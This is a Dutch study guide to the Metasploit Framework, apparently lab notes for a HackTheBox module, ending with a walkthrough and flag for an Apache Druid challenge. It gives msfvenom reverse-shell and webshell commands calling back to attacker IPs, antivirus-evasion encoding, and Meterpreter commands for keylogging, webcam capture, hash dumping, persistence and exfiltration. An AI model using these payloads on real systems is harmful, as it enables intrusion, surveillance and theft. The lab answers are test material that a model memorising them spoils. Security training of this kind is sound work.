
Het gebruik van het Metasploit Framework
Voorwoord

Binnen de socialmediakringen van de beveiligingsindustrie zijn tools onlangs het onderwerp geweest van felle discussies. Sommige discussies gingen over persoonlijke voorkeuren, terwijl andere gericht waren op het beleid rondom het openbaar maken van tools. Desondanks is het noodzakelijk om te wijzen op het belang van geautomatiseerde tools in de huidige industrie.

De algemene mening die we vaak horen, is dat het gebruik van geautomatiseerde tools tijdens een beveiligingsonderzoek niet de juiste keuze is. Dit zou zijn omdat ze de beveiligingsanalist of penetratietester geen kans bieden om zichzelf te 'bewijzen' tijdens de interactie met een kwetsbare omgeving. Bovendien zeggen velen dat tools het werk te gemakkelijk maken voor de auditor om erkenning te krijgen voor hun beoordeling.

Een andere luidruchtige groep is het hiermee oneens. Deze groep bestaat uit nieuwe leden van de infosec-gemeenschap die hun eerste stappen zetten, en degenen die argumenteren dat tools ons helpen beter te leren. Ze bieden een gebruiksvriendelijkere benadering voor de overvloed aan kwetsbaarheden die in het wild bestaan, terwijl ze tijd besparen voor de complexere onderdelen van een assessment. Wij sluiten ons aan bij deze laatste visie.

Tools kunnen in sommige gevallen inderdaad nadelen hebben:

    Ze creëren een comfortzone waaruit het moeilijk is te ontsnappen om nieuwe vaardigheden te leren.

    Ze creëren een beveiligingsrisico, simpelweg omdat ze online staan en voor iedereen zichtbaar en bruikbaar zijn.

    Ze veroorzaken een tunnelvisie: "Als de tool het niet kan, kan ik het ook niet."

Net als in andere industrieën waar creativiteit wordt gecombineerd met automatisering, kunnen tools onze visie beperken. We kunnen onterecht leren dat zij de oplossing bieden voor alle problemen en er steeds meer op gaan vertrouwen. Dit creëert een tunnelvisie die de mogelijke interacties waarover een gebruiker nadenkt, beperkt.

Tegelijkertijd zorgt het feit dat steeds meer van deze tools publiek toegankelijk worden (zie de vrijgave van NSA-tools), voor meer mogelijkheden voor kwaadwillenden met weinig kennis die snel winst willen maken of willen pronken met hun daden.
Discipline

In de huidige staat van de IT-beveiligingsindustrie bevinden we ons in een versnelde evolutie van technologieën, protocollen en systemen. Gezien de enorme hoeveelheid variabelen die we tegenkomen, moet tijd worden bespaard waar dat kan. Discipline is hierbij cruciaal:

    We zullen nooit genoeg tijd hebben. Gezien de hoeveelheid technologieën in elke omgeving krijgen we simpelweg niet de tijd voor een volledig, allesomvattend onderzoek. Tijd is geld; we werken voor een klant die vaak niet technisch onderlegd is en we moeten eerst de bulk van het werk doen: de zaken met de meeste impact.

    Geloofwaardigheid is een factor. Zelfs als we onze eigen tools maken of elke service handmatig exploiteren, concurreren we niet tegen andere industrieleden, maar tegen economische voorwaarden en de overtuigingen van het management van de klant. Zij begrijpen technische onderscheidingen vaak niet; ze willen gewoon dat het werk gedaan wordt: zoveel mogelijk resultaat in zo min mogelijk tijd.

    Je hoeft alleen indruk te maken op jezelf, niet op de infosec-gemeenschap. Als je het eerste bereikt, volgt het tweede vanzelf. Veel online artiesten verliezen hun doel uit het oog in de jacht op online validatie. Als beveiligingsonderzoekers moeten we kwetsbaarheden valideren, niet ons ego.

Conclusie

We moeten onze tools door en door kennen om onze sporen te wissen en catastrofale fouten tijdens een onderzoek te voorkomen. Veel tools kunnen onvoorspelbaar zijn; sommigen laten sporen na op het doelsysteem of laten gaten achter op ons eigen aanvalsplatform. Zolang we de regels volgen, zijn ze echter een waardevol educatief platform voor beginners en een noodzakelijke tijdsbesparing voor professionals.

    Voorkom tunnelvisie. Gebruik de tool als een hulpmiddel, niet als de ruggengraat of het "beademingsapparaat" van je volledige onderzoek.

    Lees alle technische documentatie. Leer je tools intiem kennen. Laat geen enkele functie of klasse onbenut. Dit helpt onbedoeld gedrag, boze klanten en advocaten te voorkomen.

Als we onze tools controleren en een solide methodologie opzetten, besparen tools ons tijd voor dieper onderzoek naar beveiligingsmechanismen. Dit is hoe je evolueert als professional.
Inhoudsopgave van de module:

    Introductie

    MSF Componenten (Metasploit Framework)

    MSF Sessies

    Extra functionaliteiten


## Introductie tot Metasploit

Het Metasploit Project is een op Ruby gebaseerd, modulair platform voor penetratietesten waarmee je exploit-code kunt schrijven, testen en uitvoeren. Deze code kan door de gebruiker zelf worden gemaakt of uit een database worden gehaald met de nieuwste ontdekte en gemodulariseerde exploits. Het framework bevat tools voor het testen van kwetsbaarheden, netwerk-enumeratie, het uitvoeren van aanvallen en het omzeilen van detectie. In de kern is het een verzameling veelgebruikte tools die een complete omgeving bieden voor pentesten en exploit-ontwikkeling.

Metasploit is geen "duizendpoot", maar eerder een **Zwitsers zakmes**: het heeft precies genoeg tools om ons door de meest voorkomende, ongepatchte kwetsbaarheden heen te helpen. De kracht ligt in de automatisering: met een paar commando's wissel je tussen verschillende doelwitten, exploits en payloads.

### Metasploit Pro vs. Framework

Het product is opgesplitst in twee versies. **Metasploit Pro** heeft extra functies ten opzichte van het gratis Framework:

- **Task Chains** (geautomatiseerde takenreeksen)
    
- **Social Engineering** tools
    
- **Vulnerability Validation** (validatie van kwetsbaarheden)
    
- **GUI** (Grafische gebruikersinterface)
    
- **Quick Start Wizards**
    
- **Nexpose Integratie**
    

### Metasploit Framework Console (msfconsole)

De `msfconsole` is de meest populaire interface van het framework. Het is een gecentraliseerde console die toegang biedt tot vrijwel alle opties. Hoewel het in het begin intimiderend kan lijken, is het de meest stabiele interface met volledige ondersteuning voor "tab-completion" (commando's aanvullen met de Tab-toets) en de uitvoering van externe commando's.

---

### De Architectuur Begrijpen

Om een tool echt te beheersen, moet je onder de motorkap kijken. In ParrotOS (en Kali Linux) staan de basisbestanden meestal onder `/usr/share/metasploit-framework`.

- **Data, Documentation, Lib:** De functionerende onderdelen van de interface en technische details.
    
- **Modules:** De kern van Metasploit, onderverdeeld in:
    
    - `auxiliary`: Hulptools voor scannen en enumeratie.
        
    - `exploits`: Code om kwetsbaarheden te misbruiken.
        
    - `payloads`: Code die op het doelwit wordt uitgevoerd na een succesvolle exploit (bijv. een shell).
        
    - `encoders` & `evasion`: Tools om detectie door antivirus te omzeilen.
        
    - `post`: Modules voor acties ná de inbraak (post-exploitation).
        
- **Plugins:** Voor extra functionaliteit die handmatig of automatisch geladen kan worden (zoals `sqlmap` of `nessus` integratie).
    
- **Tools:** Command-line hulpprogramma's die direct aangeroepen kunnen worden.
    

---

### Antwoorden op de vragen

**1. Welke versie van Metasploit is uitgerust met een GUI-interface?**

> **`Metasploit Pro`**

**2. Welk commando gebruik je om interactie te hebben met de gratis versie van Metasploit?**

> **`msfconsole`**


## Introductie tot MSFconsole

Om met het Metasploit Framework te werken, typen we `msfconsole` in de terminal. In beveiligingsdistributies zoals Parrot Security en Kali Linux is dit al voorgeïnstalleerd. Er zijn verschillende opties bij het opstarten, variërend van grafische switches tot procedurele opties.

### Voorbereiding

Bij het opstarten van de `msfconsole` word je begroet door de bekende "splash art" (ASCII-kunst) en de opdrachtprompt die wacht op je eerste commando.

Met de optie `-q` (quiet) start je de console zonder de banner, wat sneller is en de terminal overzichtelijk houdt:

Bash

```
msfconsole -q
```

### Up-to-date blijven

Voordat je begint, moeten je tools "scherp" zijn. Het is cruciaal dat de modules up-to-date zijn. Vroeger gebruikte men hiervoor `msfupdate`, maar tegenwoordig handelt de `apt` package manager dit moeiteloos af binnen het besturingssysteem:

Bash

```
sudo apt update && sudo apt install metasploit-framework
```

---

### De MSF Engagement Structuur

Een aanval of onderzoek met Metasploit kan worden onderverdeeld in vijf hoofdcategorieën. Deze structuur helpt je om georganiseerd te werken en de juiste functies te selecteren.

1. **Enumeration (Enumeratie):** Het identificeren van publiek toegankelijke diensten (HTTP, FTP, SQL, etc.). Versienummers zijn hier de sleutel; zij bepalen of een doelwit kwetsbaar is.
    
2. **Preparation (Voorbereiding):** Het selecteren en configureren van de juiste exploit en payload op basis van de gevonden versies.
    
3. **Exploitation (Exploitatie):** De daadwerkelijke aanval om een voet aan de grond te krijgen (foothold).
    
4. **Privilege Escalation (Privilege-escalatie):** Het verhogen van je rechten op het systeem (bijvoorbeeld van een normale gebruiker naar 'root' of 'system').
    
5. **Post-Exploitation (Post-exploitatie):** Acties nadat je toegang hebt, zoals het verzamelen van data of het verplaatsen naar andere systemen in het netwerk (pivoting).
    

Het is essentieel om jezelf vertrouwd te maken met deze structuur. We zullen elk van deze stappen doorlopen in de komende onderdelen van de module.

---

### Tips voor succes:

- Gebruik het commando `help` binnen `msfconsole` voor een overzicht van alle beschikbare commando's.
    
- Experimenteren is de beste manier om te leren; probeer verschillende functies uit in de labs en analyseer zelf de resultaten.

## Metasploit Modules

Een module is een voorbereid script met een specifiek doel. Het is belangrijk om te onthouden dat Metasploit een **hulpmiddel** is. Als een exploit faalt, betekent dit niet automatisch dat de kwetsbaarheid niet bestaat; het betekent vaak dat de exploit aanpassingen nodig heeft voor dat specifieke doelwit.

### Structuur van een Module

Modules zijn hiërarchisch opgebouwd volgens de volgende syntax:

`<Type>/<Besturingssysteem>/<Service>/<Naam>`

- **Voorbeeld:** `exploit/windows/smb/ms17_010_psexec`
    

#### De verschillende types:

|**Type**|**Beschrijving**|
|---|---|
|**Auxiliary**|Scannen, fuzzing, sniffing en administratieve taken.|
|**Exploits**|Modules die een kwetsbaarheid misbruiken om een payload af te leveren.|
|**Payloads**|De code die op het doelwit draait om een verbinding (shell) te maken.|
|**Post**|Modules voor acties na de inbraak (informatie verzamelen, verder trekken in het netwerk).|
|**Encoders**|Zorgen dat de payload intact blijft en detectie vermijdt.|
|**NOPs**|(No Operation) Worden gebruikt om payload-groottes consistent te houden.|

---

## Zoeken naar Modules

Metasploit heeft een krachtige zoekfunctie. Je kunt filters gebruiken om je resultaten te verfijnen:

Bash

```
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

**Veelgebruikte filters:**

- `type:` (exploit, auxiliary, post)
    
- `platform:` (windows, linux, android)
    
- `cve:` (jaar van de kwetsbaarheid)
    
- `rank:` (betrouwbaarheid, bijv. 'excellent')
    

---

## Werken met Modules

Zodra je een module hebt gevonden, selecteer je deze met het `use` commando. Je kunt het indexnummer uit de zoekresultaten gebruiken in plaats van het hele pad.

### Belangrijke commando's binnen een module:

- **`options`**: Toont welke instellingen verplicht zijn (`Required: yes`).
    
- **`info`**: Geeft uitgebreide details over wat de module precies doet.
    
- **`set`**: Stelt een waarde in voor een optie (bijv. `set RHOSTS 10.10.10.40`).
    
- **`setg`**: Stelt een **globale** waarde in die geldig blijft voor alle modules die je daarna laadt (bijv. jouw eigen IP als `LHOST`).
    

### De Aanval Uitvoeren

Nadat je de `RHOSTS` (doelwit) en `LHOST` (jouw machine voor de reverse shell) hebt ingesteld, start je de aanval met:

Bash

```
msf6 > run
```

_Of gebruik `exploit`, dit doet hetzelfde._

---

## Praktijkvoorbeeld: EternalRomance (MS17-010)

1. **Scan:** Je ziet poort 445 (SMB) openstaan op een Windows 7 machine.
    
2. **Zoek:** `search ms17_010`
    
3. **Selecteer:** `use 2` (of het nummer van `ms17_010_psexec`).
    
4. **Configureer:**
    
    - `set RHOSTS 10.10.10.40`
        
    - `set LHOST <Jouw_IP>`
        
5. **Voer uit:** `run`


## Wat zijn Targets?

Een exploit werkt vaak niet universeel op elk systeem. Kleine verschillen in een Service Pack, de taal van Windows of de versie van een browser kunnen ervoor zorgen dat een aanval faalt. De **Target** instelling vertelt Metasploit precies welke technische parameters (zoals geheugenadressen) gebruikt moeten worden.

### Belangrijke commando's

- **`show targets`**: Toont een lijst met alle systemen die deze specifieke module kan aanvallen.
    
- **`set target <ID>`**: Hiermee kies je handmatig een specifiek doelsysteem uit de lijst.
    

### Voorbeeld: Internet Explorer Exploit

Bij de `ie_execcommand_uaf` module zie je een lange lijst met targets:

1. IE 7 op Windows XP SP3
    
2. IE 8 op Windows XP SP3
    
3. ...
    
4. IE 9 op Windows 7
    

Als je weet dat het slachtoffer Windows 7 met IE 9 gebruikt, stel je dit handmatig in met `set target 6`. Dit is vaak betrouwbaarder dan de **Automatic (0)** stand, waarbij Metasploit zelf probeert te raden welk systeem het is.

---

## Waarom zijn Targets zo specifiek?

Dit heeft vaak te maken met **geheugenadressen**. Een exploit probeert de computer te dwingen om naar een specifiek punt in het geheugen te "springen" waar de kwaadaardige code staat.

- In Windows XP SP3 (Engels) kan dit adres anders zijn dan in Windows XP SP3 (Nederlands).
    
- Als de exploit naar het verkeerde adres springt, crasht de applicatie of het hele systeem (Blue Screen of Death), zonder dat je een shell krijgt.
    

### Hoe identificeer je een target?

Professionals gebruiken tools zoals `msfpescan` om in de programmabestanden (`binaries`) van een doelwit te zoeken naar geschikte "return addresses". Dit is geavanceerd werk dat dieper wordt behandeld in modules over **Buffer Overflows**.

---

## Samenvatting van de workflow in msfconsole

|**Stap**|**Commando**|**Toelichting**|
|---|---|---|
|**1**|`search [naam]`|Zoek de juiste exploit.|
|**2**|`use [nummer]`|Selecteer de module.|
|**3**|`info`|Lees wat de module doet en welke targets kwetsbaar zijn.|
|**4**|**`show targets`**|Bekijk de ondersteunde versies.|
|**5**|**`set target [ID]`**|Kies de juiste versie (optioneel, maar aanbevolen).|
|**6**|`options`|Stel `RHOSTS` en `LHOST` in.|
|**7**|`run`|Voer de aanval uit.|


In deze sectie leer je over Payloads, het onderdeel van de aanval dat daadwerkelijk wordt uitgevoerd op de doelmachine nadat de exploit is geslaagd.
Wat is een Payload?

Terwijl de Exploit het "gat in de muur" slaat, is de Payload de "inbreker" die naar binnen klimt om een taak uit te voeren. Meestal is die taak het terugsturen van een verbinding (shell) naar de aanvalsmachine.
Drie Soorten Payloads

Metasploit verdeelt payloads in drie categorieën om flexibiliteit te bieden bij beperkingen in netwerkverkeer of geheugenruimte:

    Singles (Inline): Een alles-in-één pakketje. Het bevat de exploit en de volledige code voor de taak.

        Voordeel: Stabiel en zelfstandig.

        Nadeel: Soms te groot voor bepaalde kwetsbaarheden.

    Stagers: Een klein stukje code dat alleen een netwerkverbinding opzet tussen de aanvaller en het slachtoffer. Het bereidt de weg voor de "Stage".

    Stages: De grotere componenten (zoals Meterpreter) die door de Stager worden gedownload. Hierdoor kan complexe malware worden uitgevoerd zonder dat de initiële exploit-grootte een probleem vormt.

Staged vs. Non-staged (Inline) herkennen

Je kunt aan de naam in Metasploit zien welk type payload je gebruikt:

    Staged: windows/shell/reverse_tcp (Gebruikt een / tussen shell en de verbinding).

    Non-staged: windows/shell_reverse_tcp (Gebruikt een _ en is één geheel).

    Tip: Staged payloads zijn vaak beter om Antivirus (AV) te omzeilen, omdat de eerste stap (Stage0) heel klein en onopvallend is.

De Meterpreter Payload

Meterpreter is de "gouden standaard" van Metasploit payloads. Het is een geavanceerde shell die volledig in het geheugen (RAM) draait en geen sporen achterlaat op de harde schijf.

Wat kun je met Meterpreter?

    getuid: Zien als welke gebruiker je bent ingelogd.

    screenshot: Een foto maken van het scherm van het slachtoffer.

    hashdump: Wachtwoord-hashes stelen uit de database van Windows.

    shell: Een normale Windows opdrachtprompt (cmd.exe) openen.

Zoeken en Instellen van Payloads

Omdat de lijst met payloads enorm is, kun je binnen msfconsole filteren met grep:
Bash

msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

Instellen:

Zodra je het nummer hebt gevonden, stel je de payload in:
Bash

msf6 > set payload windows/x64/meterpreter/reverse_tcp

Na het instellen van de payload verschijnen er nieuwe opties in het options menu, zoals LHOST (jouw IP) en LPORT (de poort waarop je luistert).
Samenvatting Configureren
Parameter	Beschrijving
RHOSTS	Het IP van het slachtoffer (Remote Host).
LHOST	Jouw IP-adres (Local Host).
LPORT	De poort waarop jij de verbinding ontvangt (standaard 4444).


# Payloads Sectie - Samenvatting & Uitbreiding

## Wat is een Payload?

**Kerngedachte:** Als de **exploit** het slot openbreekt, is de **payload** de code die naar binnen gaat om daadwerkelijk iets te doen.

```
┌─────────────┐      ┌──────────────┐      ┌─────────────────┐
│   Exploit   │ ───> │   Payload    │ ───> │  Shell Access   │
│ (Het gereedschap) │ │ (De inbreker)│      │ (Het resultaat) │
└─────────────┘      └──────────────┘      └─────────────────┘
```

---

## Drie Soorten Payloads

### 1. **Singles (Inline Payloads)**

**Concept:** Alles-in-één pakket. Exploit + volledige code voor de taak in één stuk.

**Voorbeeld:**

bash

```bash
windows/shell_reverse_tcp
```

(Let op de **underscore** `_`)

**Voordelen:**

- ✅ Stabiel - geen extra downloads nodig
- ✅ Werkt ook als verbinding slechts kort bestaat

**Nadelen:**

- ❌ Groter bestand (kan te groot zijn voor sommige exploits)
- ❌ Gemakkelijker te detecteren door AV

**Gebruik in ons Assessment:**

bash

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=172.16.1.5 LPORT=9001 -f war -o backup.war
```

Dit was een **inline payload** voor Tomcat.

---

### 2. **Stagers (Stage 0)**

**Concept:** Een klein stukje code (~100-300 bytes) dat alleen een verbinding opzet en wacht op verdere instructies.

**Voorbeeld:**

bash

````bash
windows/shell/reverse_tcp
```
(Let op de **forward slash** `/`)

**Voordelen:**
- ✅ Zeer klein (past in bijna elke exploit)
- ✅ Moeilijker te detecteren (lijkt onschuldig)

**Nadelen:**
- ❌ Vereist tweede verbinding (Stage download)
- ❌ Kwetsbaar voor netwerkinterrupties

**Hoe het werkt:**
```
[Stager] ──────────────> [Stage]
  (klein)               (groot, bv. Meterpreter)
  
Stap 1: Stager voert uit
Stap 2: Stager downloadt Stage
Stap 3: Stage voert uit
````

---

### 3. **Stages**

**Concept:** De "zware" functionaliteit die door de Stager wordt gedownload.

**Voorbeeld: Meterpreter**

bash

```bash
windows/meterpreter/reverse_tcp
       ^          ^
     Stage    Stager
```

**Gebruik in ons Assessment:** Bij Host-3 (EternalBlue) gebruikten we:

ruby

```ruby
set payload windows/x64/meterpreter/reverse_tcp
```

---

## Staged vs Non-staged: Hoe herken je het verschil?

|Type|Syntax|Voorbeeld|Grootte|
|---|---|---|---|
|**Non-staged** (Inline)|`underscore _`|`shell_reverse_tcp`|~5-50 KB|
|**Staged**|`forward slash /`|`shell/reverse_tcp`|Stage0: ~300 bytes  <br>Stage1: ~50-500 KB|

**Geheugensteuntje:**

- **Underscore** = Ondeelbaar (één stuk)
- **Slash** = Splitsbaar (twee delen)

---

## Meterpreter: De Crown Jewel

### Waarom is Meterpreter speciaal?

1. **In-memory execution:** Draait volledig in RAM, geen bestanden op disk
2. **Encrypted communication:** Verkeer is versleuteld
3. **Extensible:** Je kunt extra modules laden

### Belangrijkste Meterpreter Commando's

**Basis Informatie:**

bash

```bash
meterpreter > sysinfo          # OS informatie
meterpreter > getuid           # Huidige gebruiker
meterpreter > pwd              # Huidige directory
```

**Privilege Escalation:**

bash

```bash
meterpreter > getsystem        # Probeer SYSTEM rechten te krijgen
meterpreter > hashdump         # Dump wachtwoord hashes
```

**Spionage:**

bash

```bash
meterpreter > screenshot       # Maak screenshot
meterpreter > webcam_snap      # Maak webcam foto
meterpreter > keyscan_start    # Start keylogger
meterpreter > keyscan_dump     # Lees toetsaanslagen
```

**File System:**

bash

```bash
meterpreter > ls               # List directory
meterpreter > cd C:\\Users     # Change directory
meterpreter > download file.txt # Download naar aanvaller
meterpreter > upload tool.exe  # Upload naar target
```

**Netwerk:**

bash

```bash
meterpreter > ipconfig         # Netwerk configuratie
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.1.13
                               # Port forwarding setup
```

**Shell Access:**

bash

```bash
meterpreter > shell            # Drop naar cmd.exe/bash
```

---

## Zoeken en Selecteren van Payloads

### In msfconsole

**Alle payloads tonen:**

bash

```bash
show payloads
```

**Filteren met grep:**

bash

```bash
show payloads | grep meterpreter
show payloads | grep reverse
show payloads | grep windows
```

**Gecombineerd filteren:**

bash

```bash
show payloads | grep "windows.*meterpreter.*reverse"
```

### Praktisch Voorbeeld uit ons Assessment

**Bij Host-2 (WonderCMS):**

ruby

```ruby
msf6 exploit(50064) > show payloads

   #   Name                               
   -   ----                               
   0   php/meterpreter/bind_tcp          
   1   php/meterpreter/reverse_tcp       
   2   php/shell_bind_tcp                
   3   php/shell_reverse_tcp
```

**We kozen `php/meterpreter/bind_tcp` omdat:**

- Het was de standaard voor deze exploit
- Bind shells zijn soms betrouwbaarder in gecompliceerde netwerken

---

## msfvenom: Payloads Buiten Metasploit

**Basis syntax:**

bash

```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Belangrijke Formats

|Format|Gebruik|
|---|---|
|`exe`|Windows executable|
|`elf`|Linux executable|
|`war`|Java Web Archive (Tomcat)|
|`aspx`|ASP.NET webshell|
|`php`|PHP webshell|
|`raw`|Shellcode (voor exploits)|

### Voorbeeld uit ons Assessment

**Tomcat WAR payload:**

bash

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=172.16.1.5 \
  LPORT=9001 \
  -f war \
  -o backup.war
```

**Breakdown:**

- `-p java/jsp_shell_reverse_tcp`: Java Server Pages reverse shell
- `LHOST=172.16.1.5`: IP waar de shell naartoe belt
- `LPORT=9001`: Poort voor de callback
- `-f war`: Web Application Archive format
- `-o backup.war`: Output bestandsnaam

### Andere Handige msfvenom Voorbeelden

**Windows Reverse Shell (Executable):**

bash

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 \
  LPORT=4444 \
  -f exe \
  -o payload.exe
```

**Linux Reverse Shell:**

bash

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.10.14.5 \
  LPORT=4444 \
  -f elf \
  -o payload.elf

chmod +x payload.elf
```

**PHP Webshell:**

bash

```bash
msfvenom -p php/reverse_php \
  LHOST=10.10.14.5 \
  LPORT=4444 \
  -f raw \
  -o shell.php
```

**PowerShell One-liner:**

bash

```bash
msfvenom -p cmd/windows/reverse_powershell \
  LHOST=10.10.14.5 \
  LPORT=4444 \
  -f raw
```

---

## Payloads Encoderen (AV Evasion)

**Waarom encoderen?** Antivirus software herkent bekende payloads aan "signatures". Door te encoderen verander je de signature.

**Basic encoding:**

bash

````bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 10 \
  -f exe \
  -o encoded.exe
```

**Parameters:**
- `-e x86/shikata_ga_nai`: Encoder (polymorfisch)
- `-i 10`: Iterations (hoe vaak encoderen)

**⚠️ Waarschuwing:**
Moderne AV is niet meer gemakkelijk te omzeilen met standaard encoders!

---

## Payloads in de Praktijk: Keuze Maken

### Decision Tree
```
Moet je een bestand uploaden?
│
├─ JA → Welk platform?
│   ├─ Windows → .exe (meterpreter/reverse_tcp)
│   ├─ Linux → .elf (shell/reverse_tcp)
│   └─ Web Server → 
│       ├─ Tomcat → .war
│       ├─ IIS → .aspx
│       └─ Apache/Nginx → .php
│
└─ NEE → Command injection beschikbaar?
    ├─ Windows → PowerShell one-liner
    └─ Linux → Bash one-liner
```

### Voorbeeld Keuzes uit ons Assessment

| Host | Platform | Methode | Payload Type |
|------|----------|---------|--------------|
| Host-1 | Windows/Tomcat | WAR upload | `java/jsp_shell_reverse_tcp` (inline) |
| Host-2 | Linux/WonderCMS | RCE exploit | `php/meterpreter/bind_tcp` (staged) |
| Host-3 | Windows 2016 | EternalBlue | `windows/x64/meterpreter/reverse_tcp` (staged) |

---

## Veelvoorkomende Payload Problemen & Oplossingen

### Probleem 1: "Handler failed to bind"

**Symptoom:**
```
[-] Handler failed to bind to 172.16.1.5:4444
````

**Oorzaken:**

1. Poort al in gebruik
2. Geen root rechten voor lage poorten (<1024)

**Oplossing:**

bash

````bash
# Check wat poort gebruikt
sudo netstat -tulpn | grep 4444

# Gebruik hogere poort
set LPORT 4444

# Of gebruik sudo voor lage poorten
sudo msfconsole
```

---

### Probleem 2: "Session died immediately"

**Symptoom:**
```
[*] Meterpreter session 1 opened
[*] Session 1 died
````

**Oorzaken:**

1. Firewall blokkeert terugverbinding
2. Verkeerd `LHOST` IP (bijv. VPN IP i.p.v. intern IP)

**Oplossing:**

ruby

```ruby
# Check je IP's
ip a

# Bij pivoting via foothold, gebruik het interne IP:
set LHOST 172.16.1.5  # NIET 10.10.14.5
```

---

### Probleem 3: Payload te groot

**Symptoom:** Exploit faalt met "buffer overflow" of "size limit exceeded"

**Oplossing:** Gebruik een **staged payload** in plaats van inline:

ruby

```ruby
# Te groot:
set payload windows/meterpreter_reverse_tcp

# Beter:
set payload windows/meterpreter/reverse_tcp
```

---

## Cheat Sheet: Payload Selectie

### Voor Metasploit Exploits

ruby

```ruby
# Toon beschikbare payloads voor huidige exploit
show payloads

# Filter op type
show payloads | grep reverse
show payloads | grep meterpreter

# Selecteer payload
set payload <NAME>

# Check opties
show options

# Belangrijkste opties instellen
set LHOST <IP>
set LPORT <PORT>
```

### Voor msfvenom

bash

```bash
# Lijst alle payloads
msfvenom --list payloads

# Filter
msfvenom --list payloads | grep windows

# Toon opties voor specifieke payload
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Genereer payload
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <FILE>
```

---

## Belangrijke Takeaways

1. **Staged payloads** (`/`) = klein + stealthy, maar vereist tweede verbinding
2. **Inline payloads** (`_`) = alles-in-één, groter maar stabieler
3. **Meterpreter** = krachtigste payload, draait in-memory
4. **LHOST** moet altijd het IP zijn dat het target KAN bereiken (let op bij pivoting!)
5. **Format** hangt af van het doelplatform (exe, elf, war, php, aspx)

---

## Verbinding met ons Assessment

### Host-1 (Tomcat)

- **Payload:** `java/jsp_shell_reverse_tcp`
- **Type:** Inline (standalone WAR file)
- **Reden:** Eenvoudig, directe upload via GUI

### Host-2 (WonderCMS)

- **Payload:** `php/meterpreter/bind_tcp`
- **Type:** Staged (bind shell)
- **Reden:** De exploit handelde de staging af, bind was stabieler in dit netwerk

### Host-3 (EternalBlue)

- **Payload:** `windows/x64/meterpreter/reverse_tcp`
- **Type:** Staged (reverse shell)
- **Reden:** MS17-010 exploit vereist staged payload, Meterpreter voor post-exploitation

📋 Samenvatting van wat je deed:

    ✅ Reconnaissance: Nmap scan om de service te vinden
    ✅ Exploit Selection: exploit/linux/http/apache_druid_js_rce in Metasploit
    ✅ Configuration: RHOSTS, RPORT, LHOST correct ingesteld
    ✅ Exploitation: Meterpreter sessie verkregen
    ✅ Post-Exploitation: Flag gevonden met find / -name flag.txt

🚩 Het Antwoord

Submit dit als antwoord:

HTB{MSF_Expl01t4t10n}

📝 Technische Details van de Exploit

Wat gebeurde er:

[*] Client 10.129.4.71 (curl/7.68.0) requested /o9OBnsT50FLOnKl

De target (Apache Druid) maakte een HTTP request naar jouw attack box om de payload te downloaden.

[*] Sending payload to 10.129.4.71 (curl/7.68.0)
[*] Sending stage (3090404 bytes) to 10.129.4.71

Dit was een staged payload - eerst de stager (klein), dan de stage (Meterpreter, ~3MB).

[*] Meterpreter session 1 opened (10.10.14.114:4444 -> 10.129.4.71:45320)

Reverse TCP verbinding succesvol opgezet!

[*] Command Stager progress - 100.00% done (120/120 bytes)

De exploit gebruikte een "command stager" - kleine stukjes code die samen de volledige payload bouwen.
🔍 Command Breakdown
Wat je typte:
bash

find / -name flag.txt 2>/dev/null
```
- Zoek vanaf root (`/`) naar bestanden met naam `flag.txt`
- `2>/dev/null` = verberg error messages (zoals "Permission denied")

**Output:**
```
/root/flag.txt

Waarom type niet werkte:
bash

type /root/flag.txt
# Output: /root/flag.txt is /root/flag.txt

type is een shell builtin die checkt of iets een command/alias/function is, geen file viewer!
De juiste command:
bash

cat /root/flag.txt
# Output: HTB{MSF_Expl01t4t10n}

💡 Extra Tips voor Post-Exploitation

Als je meer tijd had, kon je ook:
Meer Informatie Verzamelen:
bash

meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > ifconfig

Persistentie Creëren:
bash

meterpreter > run persistence -h

Data Exfiltreren:
bash

meterpreter > download /root/flag.txt
meterpreter > search -f *.conf

Privilege Escalation (als je geen root was):
bash

meterpreter > getsystem
meterpreter > run post/multi/recon/local_exploit_suggester

📊 MITRE ATT&CK Mapping
Phase	Technique	Wat je deed
Reconnaissance	T1046 - Network Service Discovery	Nmap scan
Initial Access	T1190 - Exploit Public-Facing Application	Apache Druid RCE
Execution	T1059 - Command and Scripting Interpreter	Shell commands via Meterpreter
Discovery	T1083 - File and Directory Discovery	find / -name flag.txt
🎓 Belangrijke Lessen

    Filtered ≠ Closed: De standaard Druid poorten waren gefilterd, maar de service draaide wel (op een andere poort)
    Staged Payloads: De exploit gebruikte een staged payload (3MB Meterpreter) voor betere functionaliteit
    Command Stager: Bij beperkte command injection wordt de payload in kleine stukjes verzonden
    Root Access: Je had direct root rechten (/root/flag.txt was toegankelijk)

Nu kun je de flag submitten en door naar de volgende challenge! 🚀




In deze sectie leer je over Encoders. Hoewel veel mensen denken dat encoders bedoeld zijn om Antivirus (AV) te omzeilen, is hun oorspronkelijke en belangrijkste doel technisch: het compatibel maken van payloads met verschillende processor-architecturen en het verwijderen van "bad characters".
Wat doen Encoders precies?

    Bad Characters Verwijderen: Sommige exploits crashen als ze bepaalde bytes tegenkomen (zoals \x00, de "null byte", die in veel programmeertalen het einde van een string betekent). Encoders herschrijven de payload zodat deze verboden bytes niet meer voorkomen.

    Architectuur-aanpassing: Ze zorgen dat een payload draait op specifieke CPU's zoals x64, x86, sparc, of mips.

    AV Evasion (Beperkt): Door de structuur van de code te veranderen, hopen encoders de "handtekening" van malware te verbergen. Zoals je in de tekst zag, zijn moderne virusscanners (zoals die op VirusTotal) hier tegenwoordig erg goed in geworden, waardoor simpel encoderen vaak niet meer genoeg is.

Belangrijke Encoders: Shikata Ga Nai (SGN)

